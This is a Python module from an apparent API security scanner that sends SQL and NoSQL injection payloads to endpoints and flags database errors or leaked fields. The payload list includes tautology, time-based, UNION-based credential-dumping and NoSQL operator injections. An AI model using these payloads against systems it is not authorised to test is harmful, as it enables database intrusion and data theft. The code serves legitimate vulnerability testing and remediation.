"""
SQL and NoSQL Injection attack module.

Tests API endpoints for injection vulnerabilities by sending malicious payloads
in parameters and request bodies.
"""

import time
from typing import Any, Optional
import requests

from ..models import (
    AttackType,
    AttackResult,
    Endpoint,
    Parameter,
    Severity,
    Vulnerability
)


class SQLInjectionAttacker:
    """Performs SQL and NoSQL injection attacks on API endpoints."""
    
    # Common SQL injection payloads
    SQL_PAYLOADS = [
        # Basic SQL injection
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' OR '1'='1",
        "1 OR 1=1",
        
        # Time-based blind SQLi
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1; SELECT SLEEP(5)--",
        
        # Error-based SQLi
        "'",
        "''",
        "\"",
        "\"\"",
        
        # UNION-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "1' UNION SELECT username, password FROM users--",
        
        # NoSQL injection
        '{"$gt": ""}',
        '{"$ne": ""}',
        '{"$gt": null}',
        '{"$where": "1==1"}',
        '{"$or": [{"username": "admin"}, {"username": "user"}]}',
    ]
    
    # Indicators of SQL injection success
    SQL_ERROR_PATTERNS = [
        "sql syntax",
        "mysql_fetch",
        "ORA-",
        "PLS-",
        "Unclosed quotation mark",
        "quoted string not properly terminated",
        "pg_query()",
        "Warning: pg_",
        "valid MySQL result",
        "mysql_numrows()",
        "mysql_fetch_array()",
        "SQLSTATE[",
        "SQLite3::query",
        "near \"",
        "syntax error",
        "unrecognized token",
        "(mysqli_",
        "Division by zero",
        "supplied argument is not a valid MySQL",
    ]
    
    # Success indicators (data returned when shouldn't be)
    SUCCESS_PATTERNS = [
        "admin",
        "password",
        "email",
        "token",
        "secret",
        "private",
    ]
    
    def __init__(self, target_url: str, timeout: int = 5):
        """Initialize the SQL injection attacker.
        
        Args:
            target_url: Base URL of the target API
            timeout: Request timeout in seconds
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Sentinel/0.1.0 Security Scanner',
            'Accept': 'application/json'
        })
    
    def attack(self, endpoint: Endpoint, parameters_to_test: Optional[list[str]] = None) -> list[AttackResult]:
        """Perform SQL injection attacks on an endpoint.
        
        Args:
            endpoint: The endpoint to attack
            parameters_to_test: Specific parameter names to test (optional)
            
        Returns:
            List of attack results
        """
        results: list[AttackResult] = []
        
        # Determine which parameters to test
        params_to_test = self._get_testable_parameters(endpoint, parameters_to_test)
        
        for param in params_to_test:
            for payload in self.SQL_PAYLOADS:
                result = self._test_payload(endpoint, param, payload)
                results.append(result)
                
                # If we found a vulnerability, still test a few more payloads
                # to confirm it's not a false positive
                if result.success:
                    # Quick verification with another payload
                    verify_result = self._verify_vulnerability(endpoint, param)
                    if verify_result:
                        break
        
        return results
    
    def _get_testable_parameters(
        self, 
        endpoint: Endpoint, 
        parameters_to_test: Optional[list[str]]
    ) -> list[Parameter]:
        """Get list of parameters that should be tested."""
        params = []
        
        for param in endpoint.parameters:
            # Skip if specific parameters requested and this isn't one
            if parameters_to_test and param.name not in parameters_to_test:
                continue
            
            # Test query params, path params, and body params
            if param.location in ('query', 'path', 'body'):
                params.append(param)
        
        return params
    
    def _test_payload(self, endpoint: Endpoint, param: Parameter, payload: str) -> AttackResult:
        """Test a single SQL injection payload."""
        start_time = time.time()
        
        try:
            url = self._build_url(endpoint.path)
            
            # Build request based on method
            if endpoint.method.value == 'GET':
                params = {param.name: payload}
                response = self.session.get(
                    url, 
                    params=params, 
                    timeout=self.timeout
                )
            else:
                # For POST/PUT/PATCH, inject in body
                body = {param.name: payload}
                response = self.session.request(
                    endpoint.method.value,
                    url,
                    json=body,
                    timeout=self.timeout
                )
            
            duration_ms = (time.time() - start_time) * 1000
            
            # Check for vulnerability indicators
            is_vulnerable = self._check_vulnerability(response)
            
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=is_vulnerable,
                payload=payload,
                response_status=response.status_code,
                response_body=response.text[:500],  # Truncate for storage
                duration_ms=duration_ms
            )
            
        except requests.exceptions.Timeout:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=False,
                payload=payload,
                error_message="Request timed out (potential time-based SQLi)",
                duration_ms=self.timeout * 1000
            )
        except Exception as e:
            return AttackResult(
                endpoint=endpoint,
                attack_type=AttackType.SQL_INJECTION,
                success=False,
                payload=payload,
                error_message=str(e)
            )
    
    def _build_url(self, path: str) -> str:
        """Build full URL from path."""
        return f"{self.target_url}{path}"
    
    def _check_vulnerability(self, response: requests.Response) -> bool:
        """Check if response indicates SQL injection vulnerability."""
        # Check status code (200 with errors often indicates issue)
        if response.status_code == 200:
            response_text = response.text.lower()
            
            # Check for SQL error messages
            for pattern in self.SQL_ERROR_PATTERNS:
                if pattern.lower() in response_text:
                    return True
            
            # Check for unusual data patterns
            try:
                data = response.json()
                if isinstance(data, list) and len(data) > 10:
                    # Unusually large result set
                    return True
                if isinstance(data, dict):
                    # Look for sensitive fields in response
                    for key in self.SUCCESS_PATTERNS:
                        if key in str(data).lower():
                            return True
            except:
                pass
        
        # Check for error status codes with SQL error info
        if response.status_code >= 500:
            response_text = response.text.lower()
            for pattern in self.SQL_ERROR_PATTERNS:
                if pattern.lower() in response_text:
                    return True
        
        return False
    
    def _verify_vulnerability(self, endpoint: Endpoint, param: Parameter) -> bool:
        """Verify a found vulnerability with additional testing."""
        # Test with a benign value first
        try:
            url = self._build_url(endpoint.path)
            
            if endpoint.method.value == 'GET':
                normal_response = self.session.get(
                    url, 
                    params={param.name: '1'},
                    timeout=self.timeout
                )
            else:
                normal_response = self.session.request(
                    endpoint.method.value,
                    url,
                    json={param.name: '1'},
                    timeout=self.timeout
                )
            
            # Compare with injection response
            inject_response = self.session.get(
                url,
                params={param.name: "' OR '1'='1"},
                timeout=self.timeout
            )
            
            # If responses differ significantly, likely vulnerable
            return (
                normal_response.status_code != inject_response.status_code or
                len(normal_response.text) != len(inject_response.text)
            )
        except:
            return False
    
    def create_vulnerability(
        self, 
        result: AttackResult, 
        endpoint: Endpoint
    ) -> Vulnerability:
        """Create a Vulnerability object from an attack result."""
        return Vulnerability(
            endpoint=endpoint,
            attack_type=AttackType.SQL_INJECTION,
            severity=Severity.HIGH,
            title=f"SQL Injection in {endpoint.full_path}",
            description=(
                f"SQL injection vulnerability detected in parameter. "
                f"An attacker can manipulate database queries to access, modify, "
                f"or delete data. The endpoint returned database error messages or "
                f"unexpected data when malicious SQL payloads were injected."
            ),
            payload=result.payload or "",
            proof_of_concept=(
                f"Request: {endpoint.method.value} {endpoint.path}\n"
                f"Payload: {result.payload}\n"
                f"Response Status: {result.response_status}\n"
                f"Response indicates SQL error or data leak."
            ),
            recommendation=(
                "1. Use parameterized queries/prepared statements for all database operations\n"
                "2. Implement input validation and sanitization\n"
                "3. Use an ORM library that handles escaping automatically\n"
                "4. Apply the principle of least privilege to database accounts\n"
                "5. Implement Web Application Firewall (WAF) rules"
            ),
            cwe_id="CWE-89",
            owasp_category="A03:2021 - Injection",
            response_evidence=result.response_body
        )
